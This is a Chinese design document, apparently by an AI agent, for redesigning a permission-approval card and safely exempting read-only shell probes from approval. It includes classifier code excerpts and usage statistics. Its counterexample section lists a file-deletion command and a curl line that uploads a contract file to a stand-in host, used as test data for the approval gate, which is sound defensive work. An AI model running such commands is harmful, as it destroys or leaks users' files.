# 审批卡：先看懂，再决定

状态：**草稿·待爸拍板**

工单：N-UX-APPROVAL-CARD-REDESIGN · design · 2026-11-13

交付边界：设计文档、离线原型、截图和只读分析；没有修改生产权限策略。下文施工单全部等待 owner 批准，未派发。

[打开交互原型](approval-card-redesign.html)。桌面并排展示普通写入、真实危险、详情展开、英文界面、390px 窄卡，另附“只读探测不出卡”的状态。手机宽度改为单列，全部内容可换行。[依据：U、N1、N2]

## 依据与边界

每条建议标注依据；“建议”是 Neo 的设计判断，不意味着外部产品已经这样实现。

| 编号 | 可核对的来源 | 本文使用范围 |
| --- | --- | --- |
| U | 本工单的 Background、To do 1–4、Acceptance ①–⑥ | 非程序员、两按钮、折叠详情、只读免打扰、owner 先审设计的硬要求 |
| D1 | [Apple：Asking permission to use notifications](https://developer.apple.com/documentation/usernotifications/asking-permission-to-use-notifications)；[可读正文](https://developer.apple.com/documentation/usernotifications/asking-permission-to-use-notifications.md) | iOS 通知授权；在相关任务发生时请求，解释用户影响 |
| D2 | [Claude in Chrome permissions guide](https://support.claude.com/en/articles/12902446-claude-in-chrome-permissions-guide) | Claude Cowork / Desktop 中浏览器授权的选择、网站范围和敏感操作例外 |
| D3 | [Apple HIG：Alerts](https://developer.apple.com/design/human-interface-guidelines/alerts.md) | 少打断、简明动作按钮、少用警示、破坏性操作保留取消 |
| N1 | `src/renderer/styles/themes/light.css`、`dark.css`；`src/renderer/styles/global.css:20–60` | Neo 的 Zinc 表面、teal 主色、字体、4px 间距、8/12px 圆角 |
| N2 | `src/renderer/components/PermissionDialog/PermissionCard.tsx`；`RequestDetails.tsx`；`permissionPresentation.ts`；`src/renderer/components/DecisionCard.tsx`；`src/renderer/components/features/chat/DecisionSlot.tsx` | 现有卡、详情、决定槽、快捷键与危险样式的共同入口 |
| N3 | `src/host/security/commandSafety.ts`；`src/host/tools/permissionClassifier.ts`；`permissionCommandParse.ts`；`toolExecutor.ts` | 严格默认、逐段分类、未知与危险的区别 |
| N4 | `src/host/permissions/toolGrantStore.ts`；`preAskGrant.ts`；`src/host/agent/orchestratorPermissions.ts:105–150`；`src/shared/contract/permission.ts` | once / run / 24h 的既有语义和禁止持续授权的条件 |
| N5 | `src/host/tools/toolExecutorDecisionTrace.ts:31–40`；`src/host/services/core/repositories/PermissionDecisionRepository.ts` | 历史摘要只有前 80 字符；统计须回查完整命令 |
| N6 | `src/host/tools/toolPermissionClassification.ts:80–101`；`src/host/permissions/preAskGrant.ts`；`src/host/sandbox/sensitivePaths.ts` | 只读探索档、硬门、敏感读取和现有授权边界 |

外部资料访问日期：2026-11-13（本地日期）。未使用对手产品的未公开行为作为依据。

### 两个产品的具体比较

| 产品与场景 | 展示几个选择 | 怎么描述行动 | 原始细节如何处理 | 借鉴判断 |
| --- | --- | --- | --- | --- |
| iOS 系统通知授权 [D1] | 允许 / 不允许，两种决定；不是位置权限的三档授权 | 应用将发送通知，说明提醒、声音、角标的用户影响 | 官方示例呈现用户权限，没有代码、调用参数或时长档位 | 采用“影响 + 两个决定”的层级；不引入通知的自动临时授权机制 |
| Claude in Chrome 在 Cowork / Desktop 的手动审批 [D2] | Cowork 侧栏列网站范围允许、仅这次、拒绝三项；该指南对一般 Manual 的概述也写 Allow / Deny，不能混称同一张卡 | 以网站与动作范围表达授权，永久删除等敏感动作仍逐次请求 | 官方指南没有证明存在“原始 payload 折叠”控件；因此不声称其隐藏实现 | 保留范围选择、保留敏感操作例外；Neo 将范围移入次级入口是本单要求 [U]，不是照搬该产品 |

两按钮是本单的产品约束；外部比较支持层次与范围表达，不证明两按钮在 Neo 中一定优于三按钮。是否“一眼敢点”须 owner 亲审，之后做真实用户验证。[依据：U、D1、D2]

## 卡片结构与交互

默认由“需要你确认”状态标签、**一句完整行动句**、**两个直接决定按钮**、**一个次级入口**组成。状态标签不再重复写“执行命令”工具标题。句子回答“会做什么、影响哪个东西”；文件名是可理解的对象，绝对路径、参数、原始命令不在默认面显示。[依据：U、N2]

普通新建文件示例：

> Neo 将把合同要点写进「合同要点摘录.md」。

按钮为“暂不”“写入”，后者等同只允许这一次。两个按钮同一行、同等触达面积，只有允许按钮填充 Neo teal。点击即作出决定，不再先选单选项再点确认。真实危险时，取消保持容易找到，删除按钮用语义危险色描边；不设置可由 Enter 误触的整卡默认执行。[依据：U、D3、N1、N2]

“更多选项与详情”是默认唯一的次级入口，打开后按顺序展示：允许多久、实际授权范围、原始操作、键盘操作。原始操作、键盘操作各自继续折叠；“详情展开”样本预先展开原始操作以便评审。时长用单选项，选中不铸权，仍需点主按钮；关闭折叠区不等于批准。每个新请求回到 once，换请求不继承上次展开状态或选择。[依据：U、N2、N4]

等待期间锁住重复提交；host 接受应答后原位置显示一行结果。失败显示本次没有执行及可重试入口，不制造“已批准”的假终态；刷新、停车后恢复仍以 host 未决记录为准。离线原型只有本地演示结果，不发送应答或持久化授权。[依据：N2、N4]

布局沿用 Neo 主题 token；正文字号 15–16px，按钮最小高度 44px，卡片内边距 16–20px，圆角 12px。390px 页面单列，两按钮保持同排，长文件名和代码换行，详情展开也不产生横向滚动。使用原生 button / details / radio、可见 focus ring；主题跟随系统并可手动切换，减少动画偏好生效。[依据：U、N1；尺寸为本单原型的可评审设计值]

### 什么情况出现危险提示

危险提示只承载一个已知、具体的后果，紧跟行动句；不用“危险命令”“风险无法自动判定”或一串能力列表。`forceConfirm` 是必须亲手确认的流程信号，不能单独推导出红色警示。多个副作用不应被隐藏在一句温和摘要里：拆成独立待确认动作，或一句话覆盖全部实际外发/支付范围，完整对象在详情中可核对。[依据：U、N2、N3]

| 实际操作 | 行动句应交代 | 仅在事实成立时展示的一条后果 |
| --- | --- | --- |
| 创建新的合同摘录 | 写哪个新文件 | 无危险提示 |
| 删除工作文件夹外两个文件 | 删除数量、文件类别、在工作文件夹外 | 这两个文件将被永久删除，无法从废纸篓找回。 |
| 覆盖现有文件 | 哪个文件的旧内容将被替换 | 这个文件的原有内容将被替换。 |
| 外发合同 | 内容和真实接收方；邮箱、站点等决策信息不能因“收起参数”被藏掉 | 这份合同会发送给指定收件人。 |
| 付款或购买 | 金额、币种、对象 | 将从指定账户扣除已确认的金额。 |
| 未识别但必须确认 | 已知的行动和对象；不足以概括则先让 agent 改用结构化操作 | 不编造危险后果；保留原有审批/拒绝门 |

表中的外发、付款文字是结构示例，生产文案由模板工单决定；接收人、金额必须来自真实参数，不能由模型自由概括。禁止操作仍拒绝，不因卡片变温和而变成可以批准。[依据：U、N2、N6]

### 中英文和键盘规则

整张卡跟随当前界面语言，包含状态、主句、按钮、详情标签、授权范围、结果和错误；不拿 host 原因串直接当标题。工具名、路径或原始命令只在主动展开的技术细节中保留原文，属于用户数据，不自动翻译文件名。原型英文样本从会话标题到详情均为英文；真实中文文件名在英文界面仍原样引用。[依据：U、N2；对应实现入口为 `src/renderer/i18n/`]

| 语义 | 中文设计示例 | 英文设计示例 |
| --- | --- | --- |
| 行动句 | Neo 将把合同要点写进「合同要点摘录.md」。 | Neo will write the contract highlights to “Contract summary.md”. |
| 两个决定 | 暂不 / 写入 | Not now / Write file |
| 次级入口 | 更多选项与详情 | More options & details |
| 时长 | 仅这一次 / 到这次任务完成 / 24 小时内 | This time only / Until this task ends / For 24 hours |

快捷键保留 Y/N；S/A 继续对应任务内/24h，但只在卡片获得焦点且选项已展开时选择范围，再点主按钮执行。Y 始终只批准 once；N 拒绝。快捷键说明藏在“键盘操作”里，不出现 y/s/a/n 字母徽章。Tab、Enter/Space 操作聚焦按钮；输入框和 contentEditable 不截获字母，不抢输入焦点，多张请求只有当前卡处理按键。危险卡没有 S/A 持续授权；Enter 聚焦整卡不执行，必须聚焦动作按钮或明确按 Y。[依据：U、N2、N4；缩小 S/A 作用范围为本单建议，待 owner 审设计]

### 既有授权档位的映射

| 现有决定 / 返回值 | 新入口 | 语义及收口 |
| --- | --- | --- |
| once → `allow` | 默认主按钮 | 这次调用；不创建持续 grant |
| run → `allow_run` | 次级入口中的“到这次任务完成” | sessionId + tool + target，当前任务结束清除，进程重启失效 |
| 24h → `allow_24h` | 次级入口中的“24 小时内” | tool + target，跨任务、落库，到期失效；可在授权台账撤销 |
| deny → `deny` | 默认“暂不” | 拒绝此次；不暗中改为永不允许 |

不把时长重新解释成“只允许当前文件”：`toolGrantStore` 的 key 是工具加可选 target，`null` 只匹配 `null`。工具级 Write 没有 target 时范围可能覆盖其他文件，24h 还跨任务，因此展开后必须显示真实范围。原型对此明确说明；不能靠好听的文字缩小承诺、实际仍发工具级授权。若要新增逐文件授权，另立契约和迁移单，不能复用字段偷换语义。[依据：N4、U]

危险、`forceConfirm`、可编辑写回、sandbox escalation、browser once-only 等现有禁止持续授权条件保持。应用、连接器、浏览器网站的专属授权也保持当前 host 范围；本单不会把它们改成通用 run/24h。只有允许持续授权的卡才显示时长区；不额外增加永久允许、永不允许等默认选择。[依据：N2、N4、N6]

## 为什么这条只读命令弹了卡

截图省略版为：

```sh
P="/var/folders/…/service-contract.pdf"; test -e "$P" && echo EXISTS || echo MISSING; python3 -c "import os …"
```

开发库 `permission_decisions.id=1376` 的完整命令从 `tool_execution_events.id=6368` 找回。以下只把随机上传根目录替换成 `/ATTACHMENT`，语法、Python 主体不改；当前分类实验使用数据库原始字节，SHA-256 为 `64ab2001498e311d34d12e2c34293daeb20a4f2eb317a7246b84fe889d2df1a3`。这条命令实际只检查存在性、父目录类型、列附件目录，**没有提取 PDF 正文**。[依据：只读回放 `db-audit.json` case 1376]

```sh
P="/ATTACHMENT/contracts-en/service-contract.pdf"; test -e "$P" && echo EXISTS || echo MISSING; python3 -c "
import os
p='/ATTACHMENT/contracts-en/service-contract.pdf'
print('py exists:', os.path.exists(p))
d=os.path.dirname(p)
print('dir exists:', os.path.isdir(d))
try:
    print(os.listdir(d))
except Exception as e:
    print('listdir err', e)
"
```

### 实际代码路径

1. `commandSafety.ts:63–66` 的 `getShellSafetyMode()` 返回 `'strict'`。`isKnownSafeCommand()` 在同文件 `:306–354` 要求每个 execution 都在安全集合或满足条件规则：

   ```ts
   const checker = CONDITIONALLY_SAFE[program];
   if (checker?.(args) === true) continue;
   return false;
   ```

   `test`、`echo` 在只读集合，`python3` 没有正向只读证明。普通 shell 分词不理解 Python 主体是读还是写；赋值段和复合控制流也要一起证明，不能只看开头。

2. `toolExecutor.ts:1804` 的 P0 安全捷径因此不命中。P1 进入 `permissionClassifier.ts:550–609` 的严格逐段走查：

   ```ts
   const result = this.classifyBashSegment(segment, segmentContext, startTime)
     ?? this.createUnknownCompoundAsk(segment, startTime);
   if (result.decision === 'deny') return result;
   if (!strictest || result.decision === 'ask') strictest = result;
   ```

   `permissionClassifier.ts:742–751` 的未知段是：

   ```ts
   decision: 'ask',
   traceStep: createTraceStep('permission_classifier', 'B4: compound_unknown', 'ask', reason, startTime),
   riskUnknown: true,
   ```

   数据库该次 trace 正是 `B4: compound_unknown`。当前纯函数重放：`knownSafe=false`、`classification=unknown`、`validationRisk=safe`、`parsingFailed=false`。所以这次不是“解析器把整串解析失败”；是**解析成功但没有对每个可执行段给出只读证明**。`classifyCommand()` 是安全标签辅助函数；实际审批路径是 `isKnownSafeCommand → PermissionClassifier`，不能把两者误说成同一个函数。

3. `toolExecutor.ts:2058–2061` 在 `classification.decision === 'ask'` 且 `validateCommand` 只有 safe 时，把 `classification.riskUnknown` 投影为 `commandRiskUnknown`；`:2165` 传入 permission request 的 `'unknown'`。`permissionPresentation.ts:211–218` 再选择：

   ```ts
   return risk === 'unknown'
     ? p.consequenceUnknownRiskCommand
     : p.consequenceRiskCommand;
   ```

   `src/renderer/i18n/decisionCard.ts:312` 的 `consequenceUnknownRiskCommand` 就是截图英文。此处的 safe 只是危险模式扫描未命中，不等于可无审批执行。

还有同类分支：`permissionCommandParse.ts:76–83` 把不能可靠解析的命令标成 `B0: shared_shell_parse`；`permissionClassifier.ts:302–310` 的最后回退和 `toolExecutor.ts:2078–2100` 的分类器异常也可能产生未知卡。需要在共同证明入口解决，不按“含 python”或某一条截图字符串特判。[依据：N3]

## 只读探测如何不出卡

建议采用**有现成读取授权的结构化只读操作**作为首批；受约束沙箱作为复杂探测的候选路线。两条路线都要在已有 deny、显式 ask、敏感路径、来源/子 agent 拓扑、只读探索档、受保护目录等硬门之后工作；没有读取授权时不能仅凭“看起来只读”推定用户同意。附件根必须来自宿主的上传记录，工作目录必须来自可信运行上下文。[依据：U、N3、N6]

### 路线 A：受约束的只读沙箱

在已有读取权限内启动专门的 probe runner：只挂载当前工作区可读部分和本任务明确附加的文件/目录；固定运行时依赖另行只读挂载。文件系统拒绝写、删除、改权限、跟随链接越界，禁网络、IPC、应用控制、宿主凭据环境和子进程扩权；输出只经捕获的 stdout/stderr 返回，控制大小、时长与进程数。[依据：U、N6；这是候选安全设计，尚无 OS 隔离实现证据]

此 runner 允许存在性检查、授权目录列表和附件内容读取。Python 可在此受限环境读附件；不能因“没发现危险”而在宿主直接运行任意 `python3 -c`。Python 使用固定运行时、隔离启动、不加载用户 site/startup、不写字节码；无网络、无写入能力作为独立保证。无法建好隔离就不启动原命令，改用结构化读取或保持现有审批/拒绝结果；禁止降级回不受限 shell。[依据：U、N3、N6]

删除、覆盖或发送不是只读探测：识别后回到现有危险审批路径，必要时被策略直接拒绝。运行期间意外尝试写/发，由沙箱拒绝并停止；不能静默重试成宿主执行。macOS、Linux、Windows 必须分别实测所有禁止能力，未具备相同能力的平台暂不启用。此方案不打开现有默认关闭的 Codex 沙箱开关。[依据：U、N6、`.claude/rules/security.md`]

### 路线 B：基于解析结果的有限允许规则

先保留引号、变量绑定、操作符、重定向和 cwd 的 AST，再证明**每一个可能执行的分支**。只识别字面赋值、`test -e/-f/-d`、固定只读参数的 `ls`/文件读取、只做查找的 `command -v`、标准输出的 echo、受限元数据读取。`command -v` 不是 `command 任意程序`。仅 stdout/stderr 合并和丢到 `/dev/null` 可作为输出例外；`>` 文件、`tee`、未知参数、动态加载、子 shell、命令替换、后台执行一律不获只读证明。[依据：U、N3]

Python 首批仅支持可审计 AST 子集：只导入固定 os 能力；字面 `p` 与 `dirname(p)`；`exists`、`isdir`、`listdir`；简单 print 和异常输出。将它**转换成宿主受约束的 stat/list/read 操作**，而不是给 Python 可执行前缀发白名单。`open(...,'w')`、`remove`、`rename`、socket、subprocess、动态属性、未知导入、可重绑定函数、任意模块顶层执行都不获证明。文件读取可由可信 Read/read_pdf 实现；第三方解析器的缓存/临时写入要明确归入写操作或专用沙箱。[依据：U、N3、N6]

路径在执行时重新规范化，以目录/文件句柄绑定范围，抵御 symlink 与 TOCTOU；不存在的附件返回“文件找不到”，不需要为失败探测再问用户。两条路线都不额外读取附件的邻居上传目录、不扫描其他槽位、不出网。一次操作有任何片段无法证明，就整体保留现有确认策略，不允许“安全第一段”覆盖后续写/发送。[依据：U、N3、N6]

新证明应成为新内部结构，例如 `ReadOnlyProbePlan`（提议名），携带来源、授权根、解析摘要、边界能力和策略版本；不重解释已有 `readOnly`、`forceConfirm`、grant target 字段。只有可信宿主编译的 plan 可以消费证明；原始 shell 内容和模型自报的“只读”都不构成证明。[依据：N3、N6、AGENTS.md §4/§5]

### 四条真实命令的设计回放

只读读取数据库原始参数，当前仓库纯分类函数和设计识别器分别执行，**不执行这些历史命令**。以下家目录统一显示为 `~`，随机上传根显示为 `/ATTACHMENT`；原始命令的哈希、来源行及完整可公开投影见 `~/work/out/N-UX-APPROVAL-CARD-REDESIGN/db-audit.json`。授权范围来自这些调用之前的 user 消息或附件记录，不来自工具参数的形状。[依据：N5、只读数据库实验]

| 记录 | 真实命令（保持语义的展示） | 现有判定 / 触发 | 路线 B 证明与路线 A 处理 | 设计结论 |
| --- | --- | --- | --- | --- |
| 1376，截图命令；事件 6368 | 上述 P 赋值 + test + inline Python | unknown，B4；语法解析成功 | 将 exists/isdir/dirname/listdir 降为上传目录内 stat/list；或只读沙箱捕获输出；附件目录由用户附加 | 无卡 |
| 1129；message `3e36df39-b252-4b71-8995-4e64bc0532bd` | `command -v exiftool; command -v mdls; command -v sips; echo "EXIT_OK"` | unknown，B0；`command option arity is not known` | 固定工具名只查是否安装，不运行工具；或由沙箱固定运行时工具索引回答 | 无卡 |
| 1319；message `1deb3451-d71f-45a5-94d2-4e73640540b1` | `ls -l ~/work/tmp/rr79-a.txt /tmp/rr79-b.txt ~/Neo-dev/rr79-c.txt /tmp/rr79-d.txt; echo "---trash cli---"; command -v trash || echo "no trash cli"` | unknown，B0；同上 | 四个确切目标来自此前用户请求，证明所有分支仅 stat/工具查找；或逐文件只读挂载 | 无卡；删除阶段仍另问 |
| 1349；事件 6220 | `ls -lO -- "/tmp/rr80-导出缓存.tmp" "~/Neo-dev/rr80-导出缓存.tmp" 2>&1; echo "--- xattr ---"; xattr -l "/tmp/rr80-导出缓存.tmp" 2>&1; xattr -l "~/Neo-dev/rr80-导出缓存.tmp" 2>&1; echo "--- whoami ---"; id -un` | unknown，B4；语法解析成功 | 固定 `xattr -l` 只读，属性写入标志不允许；两个文件为用户明确指定；或只读沙箱 | 无卡；不自动批准同任务的 rm |

1349 原始命令在引号内是绝对家目录，表中 `~` 只是公开脱敏，不能把引号内的 `~` 当作可运行替代。1319 同一完整来源还有 1320 的再次超时记录；统计同时报告账本行与独立来源，避免把重试当作不同用户任务。[依据：N5、数据库实验]

每条原始命令都分别追加 `rm ./contract.md`、`echo changed > ./contract.md`、`curl -X POST --data-binary @./contract.md https://example.invalid/upload` 做 12 个反例。设计识别器全部返回 ask，真实代码中的更强 deny 仍优先；反例只作为数据参与判定，没有执行删除、覆盖或网络请求。路线 A 对这些片段不提供写/网络能力，必须先走原有审批路径。[依据：`db-audit.json` 的 12 条 mutations]

局限：本次的外部审计识别器是有限语法的**设计验证程序**，不是可上线的 shell 解析器，也没有证明操作系统隔离已生效。安全结论针对四条确切输入及其已记录授权的只读等价计划；上线前必须补原样 shell 引号、环境、symlink、权限收紧、各平台隔离与真实 web 任务回归。[依据：实验范围、N3、N6]

## 最近七天能减少多少

只读事务使用 `file:…?mode=ro` 和 `PRAGMA query_only=ON`，`BEGIN` 建立同一快照；没有 `.backup`、VACUUM、写源库或复制活跃 WAL。窗口为 **2026-11-07 06:37:24.173 UTC 至 2026-11-14 06:37:24.173 UTC**（右端不含），对应本地截至 11-13 晚的最近七天。过滤 SQL 与 epoch-ms 参数：

```sql
SELECT id,session_id,tool_name,summary,history_outcome,reason,recorded_at,trace_json
FROM permission_decisions
WHERE recorded_at >= 1794033444173 AND recorded_at < 1794638244173
ORDER BY id;
```

仅 `history_outcome IN ('ask-approved','ask-denied')` 进入审批分母。用 session_id、摘要前缀和调用时间回查 `messages.tool_calls` 与 `tool_execution_events.params_json` 的完整 command；冲突时只取 120 秒内唯一最近的匹配，无可靠全文则不计可减少项。逐条证明只读形状和既有用户范围；显式 ask/deny、拓扑、敏感路径和边界提示均保留。[依据：N5、N6；可复跑命令 `python3 ~/work/out/N-UX-APPROVAL-CARD-REDESIGN/audit.py --end-ms 1794638244173`]

| 指标 | 此次快照计数 |
| --- | ---: |
| 全部决策账本行（含自动批准、策略拒绝） | 794 |
| 进入过人工审批路径的账本行 | 304 |
| 其中 Bash 审批账本行 | 141 |
| 提案可消除的账本行 | **5** |
| 对应记录 | 1129、1319、1320、1349、1376 |
| 按独立完整命令来源合并后 | **4 个来源**（1319/1320 共用一条调用来源） |
| 占全部审批账本行 | **1.64%** |
| 占 Bash 审批账本行 | **3.55%** |

这证明开发库确有可消除的只读审批，不证明生产上线后全部弹卡会明显下降。重复否决可能记内层/终层两行；计数按账本行报告，标有 `in_tool_permission_ask` 的内层记录不作为可减少项；重试仍列在账本中。没有统一 request id 的历史数据无法精确反推屏幕实际出现次数。将任意 shell、sleep、包安装、osascript、内部数据目录读取都算进“可以免审批”会高估收益，因此没有这么做。[依据：N5、数据库实验]

预期体验收益是普通人只读合同不再替内部探测做决定、写入只需要看一句话、删除看到唯一真实后果。**“一眼理解”尚未做非程序员用户研究；“明显下降”也没有被这份 1.64% 总量测算证明。** 建议 owner 先评原型并决定收益是否足够，再由实施单做相同任务前后对照；新增独立 request id / readonly-plan 命中事件后，以唯一审批请求数衡量。建议目标：该合同读取链路的有授权只读探测弹卡为 0、危险变体漏问为 0，整体下降幅度以真实任务样本确定。[依据：U、N5；收益门槛待 owner 决策]

## 与模板修复单的分工

**N-FIX-APPROVAL-CARD-TEMPLATE-MISMATCH-SYSTEMIC** 决定工具类型对应的措辞和正确语义：导航、角色设置、读取不应错叫命令或覆盖。本单决定卡片层级、默认两按钮、范围选项的位置、详情折叠、危险提示何时出现，以及只读探测免卡的安全设计。本文中英文句子仅是原型示例；施工应消费该单的语义结果和 i18n，不另外建立第二套类型/文案推断，更不靠前端藏卡实现放行。该依赖不阻塞设计交付；实施相关子单须对齐它。[依据：U、N2]

## 原型证据

file:// 离线打开，CSP 禁止网络连接，字体和 token 全内联，无图片/CDN 依赖。所有截图先断言普通句子、危险后果、展开详情、英文卡和窄卡真实可见，再保存整页；断言同时检查页面和卡片内部无横向滚动。只截图作者编写的原型，没有改运行时 DOM 或注入证据文字。这里是设计原型的浏览器证据，不是 Neo web build 已实现的证据。[依据：U、原型检查日志]

| 视口与主题 | 原始截图 |
| --- | --- |
| 1200px 浅色 | [查看](approval-card-redesign-assets/prototype-1200-light.png) |
| 1200px 深色 | [查看](approval-card-redesign-assets/prototype-1200-dark.png) |
| 390px 浅色 | [查看](approval-card-redesign-assets/prototype-390-light.png) |
| 390px 深色 | [查看](approval-card-redesign-assets/prototype-390-dark.png) |

浏览器校验覆盖 55 项断言：四组可见性/滚动/主题、两主按钮、唯一危险提示、英文纯语言、无快捷键徽章、展开/时长选择/明确提交、拒绝/快捷键、零外部请求、零脚本错误；生产测试没有在原型上被替代。原始日志和审计程序保存在 `~/work/out/N-UX-APPROVAL-CARD-REDESIGN/`。[依据：`prototype-check.log`]

## 待 owner 批准的施工拆单（均未派发）

### A. 审批卡统一层级与渐进展开

状态：等待 owner 批准。范围：PermissionCard / RequestDetails / DecisionCard 的审批专用模式、DecisionSlot、i18n 消费；保留共享骨架的计划/工作流卡语义，不给全部决策卡全局改成两按钮。与模板修复单对齐文案入口。[依据：U、N2]

验收：新鲜 web build 上传合同 PDF，任务“请摘录要点到合同要点摘录.md”；需审批的写入只见一句话、两个决定，展开才见真实参数和授权范围。分别点暂不、once/run/24h，检查 host 账本结果、任务结束/24h 到期/台账撤销；390/1200px、zh/en、light/dark 截图并断言无横滚。另发任务“删除工作文件夹外我指定的两个导出缓存”，只在删除卡显示具体后果，点击暂不后文件还在。键盘输入不误批，重复点击只应答一次。[依据：U、N2、N4]

风险：视觉改动误改授权值、展开状态串请求、从共享组件波及计划卡；必须以现有 host 语义和持久化回读验收。

### B. 只读证明编译为受约束探测（建议首批）

状态：等待 owner 批准。范围：新增可信 ReadOnlyProbePlan 编译/执行路径；存在性、授权文件读取、目录列表、固定工具查找、受限元数据与 Python AST 到结构化读取；不新增任意 Python 前缀白名单。共用 deny/ask/授权根校验，输出可审计且不改现有字段语义。[依据：U、N3、N6]

验收：web build 上传同一服务合同，任务“这份合同讲什么？请提取正文，再整理要点”；截图命令和三条库中探测均无审批并真实得到存在/不存在等结果。附件原路径消失时如实报缺失。对四条输入追加 rm、覆盖、外发时仍提示或硬拒。用户 deny、显式 ask、只读探索档与后台拓扑限制各跑一条反例；symlink 越界、引号、解释器启动注入、导入副作用、未知选项/命令替换全部不能获只读证明。[依据：U、N3、N6]

风险：解析不完备被当证明、路径授权从参数推断、TOCTOU；不满足证明则保留现有行为。本设计的审计脚本不可直接复制上线。

### C. 可选只读沙箱执行器与跨平台隔离验收

状态：等待 owner 批准；是否需要首期做，由 owner 决定。范围：独立 probe runner 的只读挂载、网络/IPC/进程/凭据隔离和输出配额；不是放宽现有 Codex 默认开关。隔离不可用的平台停用该路线，继续走 B 或已有审批。[依据：U、N6]

验收：macOS/Linux/Windows 各自新鲜 web build，同一合同提取任务无读取审批；探测中的文件写、删除、外发、socket、应用自动化、symlink/子进程逃逸均实际失败，目标文件和外部接收端没有变化。禁用沙箱后绝不无隔离重试。任何需要写临时产物的解析器使用明确限定的独立机制，不冒充全只读。[依据：U、N6]

风险：平台能力不对称、运行时隐式写缓存、伪隔离；必须由真实运行证明，不能凭规则单测宣称隔离有效。

### D. 审批减少量与理解度的前后对照

状态：等待 owner 批准。范围：新独立请求标识与只读计划命中日志、去重 SQL、任务回归证据；不改旧字段语义、不记录附件正文、凭据或绝对家目录路径。[依据：U、N5]

验收：在 web build 分别完成“合同摘录”“按日期整理照片”“清理两个导出缓存”真实用户任务；同一套输入对照前后唯一审批请求数、错误批准数、拒绝后的副作用数和任务完成情况。只读阶段 0 卡、危险阶段仍确认；非程序员无需读详情即可说出对象和允许结果，具体样本人数/明显下降门槛由 owner 确定后执行。真实 Neo 任务统一走队列 realrun recipe；本次设计交付不提前声称这些运行已完成。[依据：U、N5]

风险：开发库包含大量验收探针与重复超时，不代表自然用户流量；不以 5 条候选行充当用户研究。

## 验收自查

- [x] ① 文档和离线原型齐备，五个指定状态及 1200/390px 双主题截图齐备，无横向滚动；状态为草稿·待爸拍板。
- [x] ② 默认一句行动句、两个主决定，原始命令/路径/参数折叠，无 y/s/a/n 徽章。
- [x] ③ 只有真实危险样本显示一条具体后果；英文样本没有中英混排、没有未知风险警示。
- [x] ④ 引用实际分类路径；四条原始输入的只读等价提案通过，12 个删除/覆盖/发送反例仍须确认；明确未实施生产放行。
- [x] ⑤ 与模板修复单的分工已单段说明。
- [ ] ⑥ 最近七天只读统计已完成：5 条账本记录 / 4 个独立来源；尚不能证明整体“明显下降”和非程序员理解度，收益门槛待拍板 — needs owner decision
- [ ] 最终视觉方向、首期选 B 或 B+C、整体提示下降是否足够“明显”、非程序员理解度与施工派发 — needs owner decision
